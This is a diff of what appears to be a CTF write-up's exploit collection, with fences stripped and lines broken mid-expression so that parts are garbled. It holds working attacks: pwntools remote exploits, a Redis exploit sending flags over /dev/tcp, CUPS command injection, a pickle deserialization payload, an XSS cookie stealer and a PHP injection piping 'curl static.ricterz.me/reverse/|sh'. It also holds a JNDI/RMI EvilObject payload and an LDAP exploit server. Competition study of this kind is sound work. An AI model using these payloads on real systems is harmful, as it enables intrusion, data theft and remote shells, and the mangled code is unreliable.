@@ -78,11 +78,6 @@ r += buf
 payload += b64e(r).encode()
 p.send(payload)
 p.interactive()
-```
-
-
-
-```
 from pwn import *
 
 def pb32(a):
@@ -156,11 +151,6 @@ r += buf
 payload += b64e(r).encode()
 p.send(payload)
 p.interactive()
-```
-
-
-
-```
 from pwn import *
 context.log_level="debug"
 p = remote("47.89.253.219",2121)
@@ -173,8 +163,10 @@ def ru(delim):
 def pasv():
     se("PASV")
     port_resp = rl()[len("227 Entering Passive Mode (0,0,0,0,"):].decode()
-    port1 = int(port_resp[:port_resp.find(",")])
-    port2 = int(port_resp[port_resp.find(",")+1:port_resp.find(")")])
+    port1 = int(port_resp[:
+port_resp.find(",")])
+    port2 = int(port_resp[port_resp.find(",")+1:
+port_resp.find(")")])
     port = (port1<<8)+port2
     return port
 
@@ -197,11 +189,6 @@ se("USER "+flag_name)
 rl()
 rl()
 # nc port here to get the flag
-```
-
-
-
-```
 #!/usr/bin/env python3
 import socket
 import ctypes, struct
@@ -303,7 +290,7 @@ def u64(v, endian='little'):
 HOST, PORT = "127.0.0.1", 6379
 LHOST, LPORT = "192.168.1.7", 666
 
-#bash_cmd = f'cat /flag* > /dev/tcp/{LHOST}/{LPORT}'
+    #bash_cmd = f'cat /flag* > /dev/tcp/{LHOST}/{LPORT}'
 bash_cmd = f"/readflag > /dev/tcp/{LHOST}/{LPORT}"
 
 cmds = [#   '0123456789abcdef0123456789ab'
@@ -371,11 +358,6 @@ assert query('flushall') == b'OK'
 assert query('memory purge') == b'OK'
 
 p.close()
-```
-
-
-
-```
 snprintf(cmdline, sizeof(cmdline),
              "%s/backend/%s '%s' '%s' '%s' '%s' '%s' %s",
              cups_serverbin, scheme, argv[1], argv[2], argv[3],
@@ -406,11 +388,6 @@ snprintf(cmdline, sizeof(cmdline),
             strerror(errno));
 
   return (retval);
-```
-
-
-
-```
 request = ippNewRequest(IPP_OP_PRINT_JOB);
 ippAddString(request, IPP_TAG_OPERATION, IPP_TAG_URI, "printer-uri", NULL, ldata.uri);
 
@@ -425,19 +402,14 @@ ippAddString(request, IPP_TAG_OPERATION, IPP_TAG_NAME, "job-name", NULL, na
 
     
 response = cupsDoFileRequest(http, request, ldata.resource, ldata.docfile);
-```
-
-
-
-```
-[pid 509956] execve("/usr/lib/cups/backend/beh", ["beh:/1/3/5/socket://printer:9100", "57", "' ' ;bash -c 'cat /flag >&/dev/tcp/ip/port'; ' '", "test2.txt", "1", "job-uuid=urn:uuid:2dd5abdc-ada5-3e64-7788-7322c477d818 job-originating-host-name=172.17.0.1 date-time-at-creation= date-time-at-processing= time-at-creation=1673159696 time-at-processing=1673159696", "/var/spool/cups/d00057-001"], 0x7ffc7bc7b780 /* 28 vars */) = 0                                                                                                                                                                                                           
+[pid 509956] execve("/usr/lib/cups/backend/beh", ["beh:/1/3/5/socket://printer:
+9100", "57", "' ' ;bash -c 'cat /flag >&/dev/tcp/ip/port'; ' '", "test2.txt", "1", "job-uuid=urn:
+uuid:
+2dd5abdc-ada5-3e64-7788-7322c477d818 job-originating-host-name=172.17.0.1 date-time-at-creation= date-time-at-processing= time-at-creation=1673159696 time-at-processing=1673159696", "/var/spool/cups/d00057-001"], 0x7ffc7bc7b780 /* 28 vars */) = 0                                                                                                                                                                                                           
 strace: Process 509957 attached                                                                                                                               
-[pid 509957] execve("/bin/sh", ["sh", "-c", "/usr/lib/cups/backend/socket '57' '' ;bash -c 'cat /flag >&/dev/tcp/ip/port';'' 'test2.txt' '1' 'job-uuid=urn:uuid:2dd5abdc-ada5-3e64-7788-7322c477d818 job-originating-host-name=172.17.0.1 date-time-at-creation= date-time-at-processing= time-at-creation=1673159696 time-at-processing=1673159696' /var/spool/cups/d00057-001"], 0x7ffc6af09948 /* 28 vars */) = 0
-```
-
-
-
-```
+[pid 509957] execve("/bin/sh", ["sh", "-c", "/usr/lib/cups/backend/socket '57' '' ;bash -c 'cat /flag >&/dev/tcp/ip/port';'' 'test2.txt' '1' 'job-uuid=urn:
+uuid:
+2dd5abdc-ada5-3e64-7788-7322c477d818 job-originating-host-name=172.17.0.1 date-time-at-creation= date-time-at-processing= time-at-creation=1673159696 time-at-processing=1673159696' /var/spool/cups/d00057-001"], 0x7ffc6af09948 /* 28 vars */) = 0
 from pwn import *
 s=remote("198.11.180.84",6666)
 
@@ -471,34 +443,25 @@ s.sendline(str(len(payload)))
 s.send(payload)
 
 s.interactive()
-```
-
-
-
-```
 paddle-serving-server==0.9.0 
     paddle-serving-client==0.9.0 
     paddle-serving-app==0.9.0 
     paddlepaddle==2.3.0
-```
-
-
-
-```
 (paddle_serving_server/pipeline)
-operator.py:1753 np_data = np.load(byte_data, allow_pickle=True)
-operator.py:1763 unpack_request_package(self, request)
-dag.py:799 unpack_func = op.unpack_request_package (in _build_dag)
-dag.py:814 build(self)
+operator.py:
+1753 np_data = np.load(byte_data, allow_pickle=True)
+operator.py:
+1763 unpack_request_package(self, request)
+dag.py:
+799 unpack_func = op.unpack_request_package (in _build_dag)
+dag.py:
+814 build(self)
 dag.py:94 (in_channel, out_channel, pack_rpc_func,unpack_rpc_func) = self._dag.build()
-dag.py:306 dictdata, log_id, prod_errcode, prod_errinfo = self._unpack_rpc_func(rpc_request)
-dag.py:374 req_channeldata = self._pack_channeldata(rpc_request, data_id) (in call)
+dag.py:
+306 dictdata, log_id, prod_errcode, prod_errinfo = self._unpack_rpc_func(rpc_request)
+dag.py:
+374 req_channeldata = self._pack_channeldata(rpc_request, data_id) (in call)
 pipeline_server.py:73 resp = self._dag_executor.call(request)
-```
-
-
-
-```
 /*
 import pickle
 import sys
@@ -529,7 +492,8 @@ execSync(`python3 exploit.py`);
 
 const payload = readFileSync("payload").toString("base64");
 
-const resp = await fetch("http://47.88.23.73:33085/uci/prediction", {
+const resp = await fetch("http://47.88.23.73:
+33085/uci/prediction", {
   method: "POST",
   headers: {
     "Content-Type": "application/json",
@@ -549,23 +513,8 @@ const resp = await fetch("http://47.88.23.73:33085/uci/prediction", {
   }),
 });
 console.log(await resp.text());
-```
 
-
-
-```
-<img src=1 onerror="a=new Image();a.src='https://ricterz.me/?'+document.cookie;document.getElementsByTagName('body')[0].appendChild(a)">
-```
-
-
-
-```
 http://127.0.0.1");}public function getURL(){return 1;}public function asd(){//
-```
-
-
-
-```
 POST /api.php HTTP/1.1
 Content-Length: 209
 Content-Type: application/x-www-form-urlencoded
@@ -573,47 +522,27 @@ Cookie: PHPSESSID=6ufrd768dfdbfe8lnf8onv2qc5
 Host: 47.89.249.223
 
 URL=http://127.0.0.1");}}%0a%25{
-#define A curl static.ricterz.me/reverse/|sh
-#define _A(str) _TMP(str)
-#define _TMP(str) #str
-#define RETURN_STRING(a) system(_A(A))
+    #define A curl static.ricterz.me/reverse/|sh
+    #define _A(str) _TMP(str)
+    #define _TMP(str) #str
+    #define RETURN_STRING(a) system(_A(A))
 }%25function a(){if false{var ch=0;//
-```
 
-
-
-```
-<iframe src="http://localhost:12345/post/?id=57b7d5e1-fdfc-44a4-aca7-bbdddee09b6c?callback=parent.opener.document.body.children[0].children[0].children[0].children[1].children[0].click%26xx=%d8%00"></iframe>
-```
-
-
-
-```
-<arg0 xsi:type="xs:base64Binary"><xop:Include href="file:////opt/tomcat/webapps/ROOT.war"/></arg0>
-```
-
-
-
-```
+<arg0 xsi:
+type="xs:
+base64Binary"><xop:
+Include href="file:////opt/tomcat/webapps/ROOT.war"/></arg0>
 GET /7he_d4rk_p0rt4l?curses=xxxxx HTTP/1.1
 User-Agent: The Argent Dawn
 cmd: /readflag
 Host: 198.11.177.96
-```
-
-
-
-```
 {
-   "bootstrap.servers": "117.50.188.49:9092"
+   "bootstrap.servers": "117.50.188.49:
+9092"
    "security.protocol": "SASL_SSL",
-   "sasl.jaas.config" : "com.sun.security.auth.module.JndiLoginModule required user.provider.url=/"rmi://117.50.188.49:1234/EvilObject" useFirstPass="true" serviceName="x"  group.provider.url="a";"
+   "sasl.jaas.config" : "com.sun.security.auth.module.JndiLoginModule required user.provider.url=/"rmi://117.50.188.49:
+1234/EvilObject" useFirstPass="true" serviceName="x"  group.provider.url="a";"
 }
-```
-
-
-
-```
 import com.unboundid.ldap.listener.InMemoryDirectoryServer;
 import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
 import com.unboundid.ldap.listener.InMemoryListenerConfig;
@@ -638,7 +567,8 @@ public class LdapServer {
 
     public static void main (String[] args) {
 
-        String url = "http://127.0.0.1:8000/#EvilObject";
+        String url = "http://127.0.0.1:
+8000/#EvilObject";
         int port = 1234;
 
         try {
@@ -713,11 +643,6 @@ public class LdapServer {
 
     }
 }
-```
-
-
-
-```
 from Crypto.Cipher import AES
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_v1_5, ARC4
@@ -747,7 +672,8 @@ def aes_decrypt(key, iv, data):
     cipher = AES.new(key, AES.MODE_CBC, iv)
     try:
         return(unpad(cipher.decrypt(data), AES.block_size))
-    except:
+    
+except:
         return(cipher.decrypt(data))
 # =========== AES ===========
 
@@ -869,13 +795,9 @@ except:
         enc = x[4 + 16:]
         ans = aes_decrypt(aes_key[0], iv, enc)
         print(ans)
-    except:
+    
+except:
         pass
-```
-
-
-
-```
 # sage
 p = 21888242871839275222246405745257275088696311157297823662689037894645226208583
 
@@ -903,11 +825,6 @@ o3 = u[0]
 print(o1.xy()[0], o1.xy()[1], end=" ")
 print(o2.xy()[0], o2.xy()[1], end=" ")
 print(o3.xy()[0], o3.xy()[1])
-```
-
-
-
-```
 pragma solidity ^0.8.17;
 import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import "./UniswapV2Pair.sol";
